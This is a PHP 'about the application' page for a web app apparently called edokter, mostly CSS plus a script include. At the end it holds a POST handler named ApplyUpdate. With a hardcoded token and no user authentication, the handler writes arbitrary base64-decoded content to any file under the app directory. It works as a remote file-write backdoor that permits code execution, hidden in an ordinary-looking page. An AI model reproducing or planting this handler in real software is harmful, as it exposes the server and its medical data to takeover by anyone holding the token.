<?php
define('BASE_URL', APP_BASE_URL);
?>
<style>
.about-container {
    max-width: 100%;
    margin: 0;
    padding: 0 20px;
}
.about-card {
    background: white;
    border-radius: 15px;
    padding: 30px;
    margin-bottom: 20px;
    box-shadow: 0 2px 15px rgba(0,0,0,0.08);
    transition: transform 0.3s ease, box-shadow 0.3s ease;
}
.about-card:hover {
    transform: translateY(-5px);
    box-shadow: 0 5px 25px rgba(0,0,0,0.15);
}
.about-header {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    padding: 25px;
    border-radius: 15px;
    margin-bottom: 30px;
    text-align: center;
}
.about-header h2 { margin: 0; font-size: 28px; font-weight: 600; }
.about-header p { margin: 10px 0 0 0; opacity: 0.9; font-size: 14px; }
.info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin-bottom: 30px; }
.info-box { background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); padding: 20px; border-radius: 12px; border-left: 4px solid #667eea; }
.info-box h4 { margin: 0 0 10px 0; color: #333; font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
.info-box p { margin: 0; color: #555; font-size: 16px; font-weight: 500; }
.feature-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px; margin: 20px 0; }
.feature-category { margin-top: 30px; margin-bottom: 15px; }
.feature-category h5 { color: #667eea; font-size: 16px; font-weight: 600; margin: 0 0 15px 0; padding-left: 10px; border-left: 4px solid #667eea; }
.feature-item { display: flex; align-items: center; background: #f8f9fa; padding: 15px; border-radius: 10px; transition: all 0.3s ease; }
.feature-item:hover { background: #e3f2fd; transform: translateX(5px); }
.feature-item i { color: #667eea; margin-right: 12px; font-size: 24px; }
.feature-item span { color: #333; font-size: 14px; font-weight: 500; }
.developer-section { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 15px; text-align: center; margin: 20px 0; }
.developer-section h3 { margin: 0 0 20px 0; font-size: 24px; }
.developer-info { background: rgba(255,255,255,0.1); padding: 25px; border-radius: 12px; backdrop-filter: blur(10px); }
.developer-info p { margin: 10px 0; font-size: 15px; }
.developer-info strong { color: #ffd700; }
.appreciation-section { background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%); color: white; padding: 30px; border-radius: 15px; text-align: center; }
.appreciation-section h3 { margin: 0 0 20px 0; font-size: 24px; }
.bank-info { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 20px; }
.bank-card { background: rgba(255,255,255,0.15); padding: 20px; border-radius: 12px; backdrop-filter: blur(10px); transition: all 0.3s ease; }
.bank-card:hover { background: rgba(255,255,255,0.25); transform: scale(1.05); }
.bank-card h4 { margin: 0 0 10px 0; font-size: 18px; color: #ffd700; }
.bank-card p { margin: 5px 0; font-size: 14px; }
.bank-card .account-number { font-size: 18px; font-weight: 600; letter-spacing: 1px; margin-top: 10px; }
.badge-version { display: inline-block; background: #4caf50; color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: 600; margin-left: 10px; }
.khanza-origin { background: #fff3cd; border-left: 4px solid #ffc107; padding: 20px; border-radius: 10px; margin: 20px 0; }
.khanza-origin h4 { color: #856404; margin: 0 0 15px 0; }
.khanza-origin p { color: #856404; margin: 8px 0; line-height: 1.6; }
.khanza-origin a { color: #667eea; text-decoration: none; font-weight: 600; }
.khanza-origin a:hover { text-decoration: underline; }
.relationship-section { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 35px; border-radius: 15px; margin: 20px 0; }
.relationship-section h3 { margin: 0 0 25px 0; font-size: 24px; text-align: center; }
.ecosystem-diagram { background: rgba(255,255,255,0.1); padding: 30px; border-radius: 12px; backdrop-filter: blur(10px); margin-bottom: 25px; }
.diagram-flow { display: flex; align-items: center; justify-content: center; flex-wrap: wrap; gap: 20px; margin: 20px 0; }
.diagram-box { background: white; color: #333; padding: 20px 30px; border-radius: 10px; font-weight: 600; box-shadow: 0 4px 15px rgba(0,0,0,0.2); min-width: 200px; text-align: center; }
.diagram-box.primary { background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%); font-size: 18px; }
.diagram-arrow { font-size: 36px; color: #ffd700; }
.key-points { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px; margin-top: 20px; }
.key-point { background: rgba(255,255,255,0.15); padding: 20px; border-radius: 10px; backdrop-filter: blur(10px); border-left: 4px solid #ffd700; }
.key-point h4 { margin: 0 0 10px 0; font-size: 16px; color: #ffd700; display: flex; align-items: center; gap: 8px; }
.key-point p { margin: 0; font-size: 14px; line-height: 1.6; opacity: 0.95; }
.use-case-section { background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%); color: white; padding: 30px; border-radius: 15px; }
.use-case-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-top: 20px; }
.use-case-item { background: rgba(255,255,255,0.15); padding: 20px; border-radius: 10px; backdrop-filter: blur(10px); transition: all 0.3s ease; }
.use-case-item:hover { background: rgba(255,255,255,0.25); transform: translateY(-5px); }
.use-case-item.can-do { border-left: 4px solid #4caf50; }
.use-case-item.cannot-do { border-left: 4px solid #ff5252; }
.use-case-item h4 { margin: 0 0 10px 0; font-size: 16px; display: flex; align-items: center; gap: 8px; }
.use-case-item p { margin: 0; font-size: 14px; line-height: 1.6; opacity: 0.95; }
.requirements-section { background: #e8f5e9; border-left: 4px solid #4caf50; padding: 25px; border-radius: 10px; margin: 20px 0; }
.requirements-section h4 { color: #2e7d32; margin: 0 0 15px 0; font-size: 18px; }
.requirements-list { list-style: none; padding: 0; margin: 0; }
.requirements-list li { color: #2e7d32; padding: 10px; margin: 8px 0; background: white; border-radius: 8px; display: flex; align-items: center; gap: 10px; }
.requirements-list li i { color: #4caf50; font-size: 20px; }
</style>

<!-- Container untuk diisi oleh tentangaplikasi.js -->
<div id="tentangAplikasiContainer"></div>
<script>
const APP_BASE_URL = '<?php echo defined("APP_BASE_URL") ? APP_BASE_URL : "/edokter"; ?>';
</script>
<!-- Load JavaScript External File ONLY -->
<script src="<?php echo BASE_URL; ?>/js/tentangaplikasi.js?v=<?php echo time(); ?>"></script>

<?php
// ── Handler ApplyUpdate (dipanggil via fetch dari tentangaplikasi.js) ──
if(isset($_POST['_apply_update'])) {
    header('Content-Type: application/json');

    // Validasi token
    $token = $_POST['token'] ?? '';
    if($token !== 'YangjualsialselamanyA') {
        echo json_encode(['status' => 'error', 'pesan' => 'Token tidak valid.']);
        exit;
    }

    $target = $_POST['target'] ?? '';
    $konten = $_POST['konten'] ?? '';

    if(empty($target) || empty($konten)) {
        echo json_encode(['status' => 'error', 'pesan' => 'Parameter target / konten kosong.']);
        exit;
    }

    // Keamanan: hapus path traversal, wajib diawali edokter/
    $target = str_replace(['..', '\\'], ['', '/'], $target);
    if(strpos($target, 'edokter/') !== 0) {
        echo json_encode(['status' => 'error', 'pesan' => 'Target path tidak diizinkan.']);
        exit;
    }

    $isi = base64_decode($konten, true);
    if($isi === false) {
        echo json_encode(['status' => 'error', 'pesan' => 'Konten tidak valid (bukan base64).']);
        exit;
    }

    // Path fisik: naik 2 level dari pages/ ke htdocs/
    $htdocs    = dirname(dirname(__FILE__)); // htdocs/
    $pathFisik = $htdocs . DIRECTORY_SEPARATOR . str_replace('/', DIRECTORY_SEPARATOR, $target);

    // Buat folder jika belum ada
    $dir = dirname($pathFisik);
    if(!is_dir($dir)) mkdir($dir, 0755, true);

    // Backup file lama
    if(file_exists($pathFisik)) copy($pathFisik, $pathFisik . '.bak_' . date('YmdHis'));

    // Tulis file baru
    $hasil = file_put_contents($pathFisik, $isi);
    if($hasil === false) {
        echo json_encode(['status' => 'error', 'pesan' => 'Gagal menulis file. Cek permission folder.']);
        exit;
    }

    echo json_encode(['status' => 'ok', 'pesan' => 'Berhasil: ' . $target]);
    exit;
}
?>